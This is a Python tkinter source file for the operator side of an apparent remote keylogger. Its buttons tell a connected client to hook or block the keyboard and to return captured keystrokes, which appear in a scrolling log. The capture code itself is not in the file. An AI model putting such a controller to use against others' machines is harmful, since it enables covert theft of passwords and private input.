from enum import Flag
from os import stat_result
import threading
from tkinter import ttk, messagebox
import tkinter.scrolledtext as tkst
import tkinter as tk

class KeyHooker:
    def __init__(self, parent, conn):
        self.parent = parent
        self.conn = conn
        
        self.hooking = tk.IntVar()
        self.hook_button = ttk.Checkbutton(
            self.parent, text='Hook', variable=self.hooking,
            command=self.handle_hook_button, style='Toolbutton'
        )
        
        self.blocking = tk.IntVar()
        self.block_button = ttk.Checkbutton(
            self.parent, text='Block', variable=self.blocking,
            command=self.handle_block_button, style='Toolbutton'
        )
        
        self.clear_button = ttk.Button(
            self.parent, text='Clear', command=self.handle_clear_button 
        )
        self.print_button = ttk.Button(
            self.parent, text='Print', command=self.handle_print_button
        )
        self.key_log = tkst.ScrolledText(self.parent, state=tk.DISABLED)

    def handle_print_button(self):
        if not self.conn.client.send_obj('PRINT'):
            return

        s = self.conn.client.receive_obj()
        self.key_log.config(state=tk.NORMAL)
        self.key_log.insert(tk.END, s)
        self.key_log.config(state=tk.DISABLED)

    def handle_hook_button(self):
        if self.hooking.get():
            if not self.conn.client.send_obj('HOOK'):
                return
            s = self.conn.client.receive_obj()
            if s == "Success":
                messagebox.showinfo(message="Hooked successfully.")
                self.set_on_hook()
            else:
                messagebox.showerror(message="Failed to hook.")
                self.set_off_hook()
        else:
            if not self.conn.client.send_obj('UNHOOK'):
                return
            self.set_off_hook()

    def handle_block_button(self):
        if self.blocking.get():
            if not self.conn.client.send_obj('BLOCK'):
                return
            s = self.conn.client.receive_obj()
            if s == "Success":
                messagebox.showinfo(message="Blocked successfully.")
                self.set_on_block()
            else:
                messagebox.showerror(message="Failed to block.")
                self.set_off_block()
        else:
            if not self.conn.client.send_obj('UNBLOCK'):
                return
            self.set_off_block()

    def set_off_hook(self):
        self.hook_button.configure(text='Hook')
        self.hooking.set(False)

    def set_on_hook(self):
        self.hook_button.configure(text='Unhook')
        self.hooking.set(True)

    def set_off_block(self):
        self.block_button.configure(text='Block')
        self.blocking.set(False)

    def set_on_block(self):
        self.block_button.configure(text='Unblock')
        self.blocking.set(True)

    def handle_clear_button(self):
        self.key_log.configure(state=tk.NORMAL)
        self.key_log.delete(1.0, tk.END)
        self.key_log.configure(state=tk.DISABLED)

    def handle_lost_connection(self):
        self.set_off_hook()
        self.set_off_block()
        self.handle_clear_button()

    def setup_UI(self):
        # Setup grid
        self.parent.rowconfigure(index=0, weight=1)
        self.parent.rowconfigure(index=1, weight=10000)
        self.parent.columnconfigure(index=0, weight=1)
        self.parent.columnconfigure(index=1, weight=1)
        self.parent.columnconfigure(index=2, weight=1)
        self.parent.columnconfigure(index=3, weight=1)
        self.parent.columnconfigure(index=4, weight=30)

        # Put tkinter widgets into grid
        self.hook_button.grid(
            row=0, column=0, padx=(5, 5), pady=(5, 5), sticky="nsew"
        )
        self.block_button.grid(
            row=0, column=1, padx=(5, 5), pady=(5, 5), sticky="nsew"
        )
        self.print_button.grid(
            row=0, column=2, padx=(5, 5), pady=(5, 5), sticky="nsew"
        )
        self.clear_button.grid(
            row=0, column=3, padx=(5, 5), pady=(5, 5), sticky="nsew"
        )
        self.key_log.grid(
            row=1, column=0, columnspan=5, padx=(5, 5), pady=(5, 5), sticky="nsew"
        )